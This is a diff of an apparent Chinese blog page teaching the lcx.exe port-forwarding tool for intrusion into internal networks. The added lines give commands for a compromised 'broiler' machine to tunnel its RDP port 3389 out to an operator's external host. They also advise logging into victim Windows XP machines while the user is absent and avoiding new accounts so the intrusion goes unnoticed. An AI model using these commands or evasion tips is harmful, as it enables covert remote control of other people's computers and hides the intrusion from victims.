@@ -120,7 +120,8 @@
 <meta property="og:description" content="端口映射在入侵内网的时候经常用到，特别是要登陆远程终端服务时，使用端口映射就非常方便。 Lcx.exe是一个端口转发工具，相当于把肉鸡A上的3389端口转发到具有外网IP地址的B机上,这样连接B机的3389就相当于连接A机的3389端口。Lcx程序多用于被控制计算机(肉鸡)处于内网的情况，被控制机可能中了木马程序，虽然能够进行控制，但还是没有使用远程终端登陆到本机进行管理方便，因此在很多情况下，都">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtx91elgyj30vw0enab4.jpg">
-<meta property="og:updated_time" content="2018-12-03T14:44:48.933Z">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv4w0r4fcj30hr09fjru.jpg">
+<meta property="og:updated_time" content="2018-12-04T15:51:07.594Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="lcx使用:端口转发">
 <meta name="twitter:description" content="端口映射在入侵内网的时候经常用到，特别是要登陆远程终端服务时，使用端口映射就非常方便。 Lcx.exe是一个端口转发工具，相当于把肉鸡A上的3389端口转发到具有外网IP地址的B机上,这样连接B机的3389就相当于连接A机的3389端口。Lcx程序多用于被控制计算机(肉鸡)处于内网的情况，被控制机可能中了木马程序，虽然能够进行控制，但还是没有使用远程终端登陆到本机进行管理方便，因此在很多情况下，都">
@@ -398,12 +399,24 @@
                 
               
 
-              <time title="创建时间：2018-12-03 21:59:05 / 修改时间：22:44:48" itemprop="dateCreated datePublished" datetime="2018-12-03T21:59:05+08:00">2018-12-03</time>
+              <time title="创建时间：2018-12-03 21:59:05" itemprop="dateCreated datePublished" datetime="2018-12-03T21:59:05+08:00">2018-12-03</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2018-12-04 23:51:07" itemprop="dateModified" datetime="2018-12-04T23:51:07+08:00">2018-12-04</time>
               
             
           </span>
@@ -467,7 +480,18 @@
 <p>例如：</p>
 <h3 id="本机端口转向："><a href="#本机端口转向：" class="headerlink" title="本机端口转向："></a>本机端口转向：</h3><pre><code>lcx -tran 55 127.0.0.1 3389
 </code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxtx91elgyj30vw0enab4.jpg" alt=""></p>
-<h3 id="转向其他主机端口："><a href="#转向其他主机端口：" class="headerlink" title="转向其他主机端口："></a>转向其他主机端口：</h3>
+<h3 id="转向其他主机端口："><a href="#转向其他主机端口：" class="headerlink" title="转向其他主机端口："></a>转向其他主机端口：</h3><p>肉机运行：</p>
+<pre><code>lcx.exe -slave 10.60.17.46 55 192.168.209.160 3389
+</code></pre><p>操作机运行：</p>
+<pre><code>lcx.exe -listen 55 3389
+</code></pre><p>【原来的图片丢了….只能借用一下别人的了】<br><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv4w0r4fcj30hr09fjru.jpg" alt=""></p>
+<p>在被控制计算机上使用<code>netstat -an</code>查看当前所有的连接时，可以看到被控制计算机时在跟自己进行远程终端连接，而实际的3389端口是跟本机的55端口进行连接的。</p>
+<p><strong>注意：</strong></p>
+<ul>
+<li>如果被控制计算机是服务器，则在登陆时可以直接进行登陆;如果被控制计算机是Windows XP系统，则最好选择用户不在计算机的时间进行登陆，否则容易被发现。</li>
+<li>不要轻易在被控制计算机上建立账号，尤其是Windows XP，建立帐号后，会立即在登陆界面中进行显示。</li>
+</ul>
+
       
     </div>
 
